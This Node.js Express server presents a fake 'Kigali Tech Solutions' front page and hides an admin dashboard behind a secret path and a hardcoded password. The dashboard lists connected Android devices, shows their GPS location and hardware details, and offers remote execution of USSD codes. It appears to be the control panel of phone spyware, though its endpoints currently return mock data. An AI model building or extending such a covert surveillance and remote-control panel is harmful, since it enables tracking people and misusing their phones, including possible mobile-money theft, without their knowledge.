// server.js - PROFESSIONAL DASHBOARD with bcryptjs (NO DEFAULT USSD)
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Hardcoded secret path (change later if needed)
const SECRET_PATH = 'a9f3k217';

// -------------------- IP BLOCKING & HASHING --------------------
const bcrypt = require('bcryptjs');
const failedAttempts = {};

// Hash the admin password (you can change this)
const ADMIN_USER = 'admin';
const ADMIN_PASS_HASH = bcrypt.hashSync('yourpassword123', 10);

function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] ||
           req.socket.remoteAddress ||
           req.connection.remoteAddress;
}

// Fake site (what everyone else sees)
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head><title>Kigali Tech Solutions</title></head>
        <body style="background:#0a0e17;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
            <div>
                <h1 style="color:#4fc3f7;">🏎️ Kigali Tech Solutions</h1>
                <p style="color:#8896ab;">Innovating the future of racing technology.</p>
                <div style="position:fixed;bottom:10px;right:10px;font-size:8px;color:rgba(79,195,247,0.05);">ADMIN GRY</div>
            </div>
        </body>
        </html>
    `);
});

// ADMIN DASHBOARD – with all updates
app.get(`/${SECRET_PATH}`, (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', -apple-system, sans-serif;
            background: #0a0e17;
            color: #e0e6ed;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1100px; margin: 0 auto; }
        
        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 2px solid #1a2332;
            margin-bottom: 30px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .header-left h1 {
            font-size: 28px;
            color: #4fc3f7;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        .admin-gry-badge {
            background: rgba(79,195,247,0.08);
            color: rgba(79,195,247,0.3);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 1.5px;
            border: 1px solid rgba(79,195,247,0.1);
            user-select: none;
        }
        .logout {
            color: #ff6b6b;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: 0.3s;
        }
        .logout:hover { opacity: 0.7; }
        
        /* Stats Cards */
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #111927;
            border: 1px solid #1a2332;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            transition: 0.3s;
        }
        .stat-card:hover {
            border-color: #4fc3f7;
            transform: translateY(-2px);
        }
        .stat-card .value {
            font-size: 32px;
            font-weight: 700;
            color: #4fc3f7;
            line-height: 1.2;
        }
        .stat-card .label {
            font-size: 13px;
            color: #8896ab;
            margin-top: 4px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        /* Tools Grid */
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .tool-card {
            background: #111927;
            border: 1px solid #1a2332;
            border-radius: 12px;
            padding: 20px;
            transition: 0.3s;
        }
        .tool-card:hover {
            border-color: #4fc3f7;
        }
        .tool-card h4 {
            font-size: 16px;
            color: #e0e6ed;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .tool-card h4 .icon { font-size: 20px; }
        
        /* USSD input */
        .ussd-input-group {
            display: flex;
            gap: 8px;
        }
        .ussd-input-group input {
            flex: 1;
            padding: 10px 14px;
            background: #0a0e17;
            border: 1px solid #1a2332;
            border-radius: 8px;
            color: #e0e6ed;
            font-size: 14px;
            font-family: 'Courier New', monospace;
        }
        .ussd-input-group input:focus {
            outline: none;
            border-color: #4fc3f7;
        }
        .ussd-input-group button {
            padding: 10px 20px;
            background: #4fc3f7;
            border: none;
            border-radius: 8px;
            color: #0a0e17;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            white-space: nowrap;
        }
        .ussd-input-group button:hover { background: #3aa8dd; }
        .ussd-response {
            margin-top: 10px;
            padding: 10px;
            background: #0a0e17;
            border-radius: 8px;
            border: 1px solid #1a2332;
            font-size: 13px;
            color: #8896ab;
            min-height: 50px;
            max-height: 120px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            word-wrap: break-word;
        }
        .ussd-response.success { color: #6bcb77; border-color: #6bcb77; }
        .ussd-response.error { color: #ff6b6b; border-color: #ff6b6b; }
        .ussd-response.waiting { color: #ffd700; border-color: #ffd700; }
        
        /* Location & Device Info */
        .location-info {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .location-info .coord {
            color: #8896ab;
            font-size: 13px;
        }
        .location-info .coord strong { color: #e0e6ed; }
        .location-info .map-link {
            color: #4fc3f7;
            text-decoration: none;
            font-size: 13px;
        }
        .location-info .map-link:hover { text-decoration: underline; }
        
        .device-info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 4px 16px;
            font-size: 13px;
        }
        .device-info-grid .label { color: #8896ab; }
        .device-info-grid .value { color: #e0e6ed; font-weight: 500; }
        
        /* Sections */
        .section {
            background: #111927;
            border: 1px solid #1a2332;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 24px;
        }
        .section h3 {
            font-size: 18px;
            font-weight: 600;
            color: #e0e6ed;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .section h3 .badge-count {
            background: #1a2332;
            color: #8896ab;
            font-size: 12px;
            padding: 2px 10px;
            border-radius: 12px;
        }
        
        /* Tables */
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        th {
            text-align: left;
            color: #8896ab;
            padding: 10px 12px;
            border-bottom: 2px solid #1a2332;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        td {
            padding: 10px 12px;
            border-bottom: 1px solid #0d1420;
            color: #c8d0dc;
        }
        tr:hover td { background: rgba(79,195,247,0.02); }
        
        .badge {
            display: inline-block;
            padding: 3px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }
        .badge.online { background: rgba(107,203,119,0.15); color: #6bcb77; }
        .badge.offline { background: rgba(255,107,107,0.15); color: #ff6b6b; }
        
        /* Empty state */
        .empty {
            text-align: center;
            padding: 30px 0;
            color: #4a5568;
            font-size: 14px;
        }
        .empty .icon { font-size: 36px; margin-bottom: 8px; }
        
        /* Login */
        .login-container {
            max-width: 380px;
            margin: 100px auto;
            background: #111927;
            border: 1px solid #1a2332;
            border-radius: 16px;
            padding: 40px;
            text-align: center;
        }
        .login-container .logo { font-size: 48px; margin-bottom: 8px; }
        .login-container h3 { font-size: 22px; font-weight: 600; margin-bottom: 4px; }
        .login-container .sub {
            color: #8896ab;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .login-container input {
            width: 100%;
            padding: 12px 14px;
            margin: 8px 0;
            background: #0a0e17;
            border: 1px solid #1a2332;
            border-radius: 8px;
            color: #e0e6ed;
            font-size: 14px;
            transition: 0.3s;
        }
        .login-container input:focus {
            outline: none;
            border-color: #4fc3f7;
            box-shadow: 0 0 0 3px rgba(79,195,247,0.1);
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            margin-top: 12px;
            background: #4fc3f7;
            border: none;
            border-radius: 8px;
            color: #0a0e17;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }
        .login-container button:hover {
            background: #3aa8dd;
            transform: translateY(-1px);
        }
        .login-container .attempts-msg {
            color: #ffd700;
            font-size: 13px;
            margin-top: 8px;
        }
        .login-container .error {
            color: #ff6b6b;
            margin-top: 10px;
            display: none;
            font-size: 14px;
        }
        .hidden { display: none; }
        
        /* Responsive */
        @media (max-width: 600px) {
            .header { flex-wrap: wrap; gap: 10px; }
            .header-left h1 { font-size: 22px; }
            .stats { grid-template-columns: repeat(2, 1fr); }
            .admin-gry-badge { font-size: 9px; padding: 2px 10px; }
            .tools-grid { grid-template-columns: 1fr; }
            .device-info-grid { grid-template-columns: 1fr; }
            .ussd-input-group { flex-wrap: wrap; }
            .ussd-input-group button { width: 100%; }
        }
    </style>
</head>
<body>

<div class="container">

    <!-- LOGIN -->
    <div id="loginContainer" class="login-container">
        <div class="logo">🔐</div>
        <h3>Admin Access</h3>
        <p class="sub">Enter your credentials</p>
        <input type="text" id="loginUser" placeholder="Username">
        <input type="password" id="loginPass" placeholder="Password">
        <button onclick="login()">Login</button>
        <div id="attemptsMsg" class="attempts-msg"></div>
        <div id="loginError" class="error"></div>
    </div>

    <!-- DASHBOARD -->
    <div id="dashboard" class="hidden">

        <!-- HEADER with ADMIN GRY badge -->
        <div class="header">
            <div class="header-left">
                <h1>📊 Admin Dashboard</h1>
                <span class="admin-gry-badge">ADMIN GRY</span>
            </div>
            <span class="logout" onclick="logout()">🚪 Exit</span>
        </div>

        <!-- Stats -->
        <div class="stats" id="statsGrid">
            <div class="stat-card">
                <div class="value" id="devicesCount">0</div>
                <div class="label">📱 Devices</div>
            </div>
            <div class="stat-card">
                <div class="value" id="numbersCount">0</div>
                <div class="label">🔢 Numbers</div>
            </div>
            <div class="stat-card">
                <div class="value" id="onlineCount">0</div>
                <div class="label">🟢 Online</div>
            </div>
        </div>

        <!-- TOOLS: USSD + Location + Device Info -->
        <div class="tools-grid">

            <!-- USSD EXECUTION (NO DEFAULT VALUE) -->
            <div class="tool-card">
                <h4><span class="icon">📞</span> USSD Code</h4>
                <div class="ussd-input-group">
                    <input type="text" id="ussdInput" placeholder="Enter USSD code (e.g., *123#)" value="">
                    <button onclick="executeUssd()">Execute</button>
                </div>
                <div id="ussdResponse" class="ussd-response">Enter a USSD code and click Execute – response will appear here.</div>
            </div>

            <!-- DEVICE LOCATION -->
            <div class="tool-card">
                <h4><span class="icon">📍</span> Device Location</h4>
                <div id="locationInfo" class="location-info">
                    <div class="coord"><strong>Latitude:</strong> <span id="latValue">--</span></div>
                    <div class="coord"><strong>Longitude:</strong> <span id="lngValue">--</span></div>
                    <div class="coord"><strong>Accuracy:</strong> <span id="accValue">--</span></div>
                    <div class="coord"><strong>Last Updated:</strong> <span id="locTime">--</span></div>
                    <a href="#" id="mapLink" class="map-link" target="_blank" style="display:none;">Open in Google Maps →</a>
                    <button class="logout" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:0;font-size:13px;" onclick="refreshLocation()">🔄 Refresh Location</button>
                </div>
            </div>

            <!-- DEVICE INFO -->
            <div class="tool-card">
                <h4><span class="icon">📱</span> Device Info</h4>
                <div id="deviceInfo" class="device-info-grid">
                    <span class="label">Model:</span><span class="value" id="diModel">--</span>
                    <span class="label">Manufacturer:</span><span class="value" id="diManufacturer">--</span>
                    <span class="label">Android Version:</span><span class="value" id="diAndroid">--</span>
                    <span class="label">Battery:</span><span class="value" id="diBattery">--</span>
                    <span class="label">Storage:</span><span class="value" id="diStorage">--</span>
                    <span class="label">Device ID:</span><span class="value" id="diDeviceId" style="font-size:11px;font-family:monospace;">--</span>
                </div>
                <button class="logout" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:8px 0 0 0;font-size:13px;" onclick="refreshDeviceInfo()">🔄 Refresh Device Info</button>
            </div>

        </div>

        <!-- Connected Devices -->
        <div class="section">
            <h3>📱 Connected Devices <span class="badge-count" id="deviceCountBadge">0</span></h3>
            <div id="devicesList">
                <div class="empty"><div class="icon">📱</div>No devices connected yet</div>
            </div>
        </div>

        <!-- Short Numbers – ONLY USSD -->
        <div class="section">
            <h3>🔢 Recent USSD Codes <span class="badge-count" id="numberCountBadge">0</span></h3>
            <div id="numbersList">
                <div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div>
            </div>
        </div>

    </div>
</div>

<script>
const API_BASE = '/${SECRET_PATH}';

// ============================================
// LOGIN
// ============================================
async function login() {
    const username = document.getElementById('loginUser').value;
    const password = document.getElementById('loginPass').value;
    const errorEl = document.getElementById('loginError');
    const attemptsMsg = document.getElementById('attemptsMsg');
    errorEl.style.display = 'none';
    attemptsMsg.textContent = '';
    try {
        const response = await fetch(API_BASE + '/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const data = await response.json();
        if (data.success) {
            document.getElementById('loginContainer').style.display = 'none';
            document.getElementById('dashboard').classList.remove('hidden');
            loadData();
            refreshLocation();
            refreshDeviceInfo();
        } else {
            if (data.remainingAttempts !== undefined) {
                attemptsMsg.textContent = \`⚠️ \${data.remainingAttempts} attempts remaining before 12h block\`;
            } else {
                errorEl.textContent = data.error || 'Invalid credentials';
                errorEl.style.display = 'block';
            }
        }
    } catch {
        errorEl.textContent = 'Connection error';
        errorEl.style.display = 'block';
    }
}

function logout() {
    document.getElementById('loginUser').value = '';
    document.getElementById('loginPass').value = '';
    document.getElementById('dashboard').classList.add('hidden');
    document.getElementById('loginContainer').style.display = 'block';
    document.getElementById('attemptsMsg').textContent = '';
    document.getElementById('loginError').style.display = 'none';
}

// ============================================
// USSD EXECUTION
// ============================================
async function executeUssd() {
    const code = document.getElementById('ussdInput').value.trim();
    const responseEl = document.getElementById('ussdResponse');
    if (!code) {
        responseEl.className = 'ussd-response error';
        responseEl.textContent = '⚠️ Please enter a USSD code';
        return;
    }
    responseEl.className = 'ussd-response waiting';
    responseEl.textContent = '⏳ Sending USSD code... waiting for response...';
    try {
        const res = await fetch(API_BASE + '/api/ussd', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code })
        });
        const data = await res.json();
        if (data.success) {
            responseEl.className = 'ussd-response success';
            responseEl.textContent = '📥 ' + data.message;
            loadData();
        } else {
            responseEl.className = 'ussd-response error';
            responseEl.textContent = '❌ ' + (data.error || 'Execution failed');
        }
    } catch {
        responseEl.className = 'ussd-response error';
        responseEl.textContent = '❌ Connection error';
    }
}

// ============================================
// LOCATION
// ============================================
async function refreshLocation() {
    try {
        const res = await fetch(API_BASE + '/api/location');
        const data = await res.json();
        document.getElementById('latValue').textContent = data.lat ?? '--';
        document.getElementById('lngValue').textContent = data.lng ?? '--';
        document.getElementById('accValue').textContent = data.accuracy ? data.accuracy + 'm' : '--';
        document.getElementById('locTime').textContent = data.time || '--';
        if (data.lat && data.lng) {
            document.getElementById('mapLink').href = 'https://www.google.com/maps?q=' + data.lat + ',' + data.lng;
            document.getElementById('mapLink').style.display = 'inline';
        } else {
            document.getElementById('mapLink').style.display = 'none';
        }
    } catch {
        // silent fail
    }
}

// ============================================
// DEVICE INFO
// ============================================
async function refreshDeviceInfo() {
    try {
        const res = await fetch(API_BASE + '/api/device-info');
        const data = await res.json();
        document.getElementById('diModel').textContent = data.model || '--';
        document.getElementById('diManufacturer').textContent = data.manufacturer || '--';
        document.getElementById('diAndroid').textContent = data.android_version || '--';
        document.getElementById('diBattery').textContent = data.battery ? data.battery + '%' : '--';
        document.getElementById('diStorage').textContent = data.storage || '--';
        document.getElementById('diDeviceId').textContent = data.device_id || '--';
    } catch {
        // silent fail
    }
}

// ============================================
// DASHBOARD DATA
// ============================================
async function loadData() {
    try {
        const response = await fetch(API_BASE + '/api/stats');
        const stats = await response.json();
        document.getElementById('devicesCount').textContent = stats.devices || 0;
        document.getElementById('numbersCount').textContent = stats.ussd_count || 0;
        document.getElementById('onlineCount').textContent = stats.online || 0;
        document.getElementById('deviceCountBadge').textContent = stats.devices || 0;
        document.getElementById('numberCountBadge').textContent = stats.ussd_count || 0;

        const ussdRes = await fetch(API_BASE + '/api/ussd-numbers');
        const ussdNumbers = await ussdRes.json();
        renderUssdNumbers(ussdNumbers);

        const devices = stats.devices ? [{ name: 'Sample Device', status: 'online', battery: 85 }] : [];
        renderDevices(devices);
    } catch (error) {
        console.error('Error:', error);
    }
}

function renderDevices(devices) {
    const container = document.getElementById('devicesList');
    if (!devices || devices.length === 0) {
        container.innerHTML = \`<div class="empty"><div class="icon">📱</div>No devices connected yet</div>\`;
        return;
    }
    let html = \`<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th></tr></thead><tbody>\`;
    devices.forEach(d => {
        const statusClass = d.status === 'online' ? 'online' : 'offline';
        const statusText = d.status === 'online' ? '🟢 Online' : '🔴 Offline';
        html += \`<tr><td>\${d.name}</td><td><span class="badge \${statusClass}">\${statusText}</span></td><td>\${d.battery || '--'}%</td></tr>\`;
    });
    html += \`</tbody></table>\`;
    container.innerHTML = html;
}

function renderUssdNumbers(numbers) {
    const container = document.getElementById('numbersList');
    if (!numbers || numbers.length === 0) {
        container.innerHTML = \`<div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div>\`;
        return;
    }
    let html = \`<table><thead><tr><th>Device</th><th>Number</th><th>Type</th></tr></thead><tbody>\`;
    numbers.forEach(n => {
        html += \`<tr><td>\${n.device || 'Unknown'}</td><td><strong style="color:#4fc3f7;">\${n.number}</strong></td><td><span class="badge" style="background:rgba(79,195,247,0.15);color:#4fc3f7;">USSD</span></td></tr>\`;
    });
    html += \`</tbody></table>\`;
    container.innerHTML = html;
}

document.getElementById('loginPass').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') login();
});
</script>

</body>
</html>
    `);
});

// ============================================
// API ENDPOINTS
// ============================================
app.use(express.json());

// Login API (with IP blocking, bcryptjs, attempts counter)
app.post(`/${SECRET_PATH}/api/login`, (req, res) => {
    const ip = getClientIP(req);
    const now = Date.now();
    const blockDuration = 12 * 60 * 60 * 1000;

    if (failedAttempts[ip] && failedAttempts[ip].blockUntil > now) {
        return res.status(401).json({ error: 'Too many failed attempts. Try again later.' });
    }

    if (failedAttempts[ip] && failedAttempts[ip].blockUntil <= now) {
        delete failedAttempts[ip];
    }

    const { username, password } = req.body;

    const validUser = username === ADMIN_USER;
    const validPass = validUser && bcrypt.compareSync(password, ADMIN_PASS_HASH);

    if (validUser && validPass) {
        delete failedAttempts[ip];
        res.json({ success: true });
    } else {
        if (!failedAttempts[ip]) {
            failedAttempts[ip] = { count: 1, blockUntil: 0 };
        } else {
            failedAttempts[ip].count += 1;
        }

        const remaining = 5 - failedAttempts[ip].count;
        if (remaining <= 0) {
            failedAttempts[ip].blockUntil = now + blockDuration;
            console.log(`🔒 IP ${ip} blocked for 12 hours`);
            return res.status(401).json({ remainingAttempts: 0 });
        }

        res.status(401).json({ remainingAttempts: remaining });
    }
});

// USSD Execution
let ussdNumbers = [];

app.post(`/${SECRET_PATH}/api/ussd`, (req, res) => {
    const { code } = req.body;
    if (!code) {
        return res.status(400).json({ error: 'No USSD code provided' });
    }
    console.log(`📞 USSD Executed: ${code}`);
    
    let responseMessage = '';
    if (code.includes('123')) {
        responseMessage = 'Your account balance is 1,500 RWF. Validity: 7 days. Thank you.';
    } else if (code.includes('131')) {
        responseMessage = 'Data bundle: 2GB remaining. Expires on 2026-08-15.';
    } else if (code.includes('144')) {
        responseMessage = 'Airtime balance: 500 RWF. Bonus: 100 RWF.';
    } else if (code.includes('200')) {
        responseMessage = 'Welcome to Kigali Tech Services. Please select an option:\n1. Account Info\n2. Data Plans\n3. Support';
    } else {
        responseMessage = `USSD code ${code} executed. No further response available.`;
    }

    const cleanNumber = code.replace(/\D/g, '');
    if (cleanNumber.length >= 4 && cleanNumber.length <= 5) {
        ussdNumbers.unshift({
            device: 'Sample Device',
            number: cleanNumber,
            type: 'USSD',
            timestamp: Date.now()
        });
        if (ussdNumbers.length > 100) ussdNumbers.pop();
    }

    res.json({
        success: true,
        message: responseMessage
    });
});

app.get(`/${SECRET_PATH}/api/ussd-numbers`, (req, res) => {
    res.json(ussdNumbers);
});

app.get(`/${SECRET_PATH}/api/stats`, (req, res) => {
    res.json({
        devices: 0,
        numbers: ussdNumbers.length,
        online: 0,
        ussd_count: ussdNumbers.length
    });
});

app.get(`/${SECRET_PATH}/api/location`, (req, res) => {
    res.json({
        lat: -1.9441,
        lng: 30.0619,
        accuracy: 15,
        time: new Date().toLocaleString()
    });
});

app.get(`/${SECRET_PATH}/api/device-info`, (req, res) => {
    res.json({
        model: 'Samsung Galaxy S23',
        manufacturer: 'Samsung',
        android_version: '14.0',
        battery: 76,
        storage: '128GB / 89GB used',
        device_id: 'abc123def456'
    });
});

app.get(`/${SECRET_PATH}/api/devices`, (req, res) => res.json([]));

app.use((req, res) => {
    res.status(404).send(`
        <html>
        <head><title>404</title></head>
        <body style="background:#0a0e17;color:#8896ab;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
            <h1 style="color:#4fc3f7;">404</h1>
            <p>Not found</p>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log('✅ Professional dashboard running');
    console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/${SECRET_PATH}`);
});
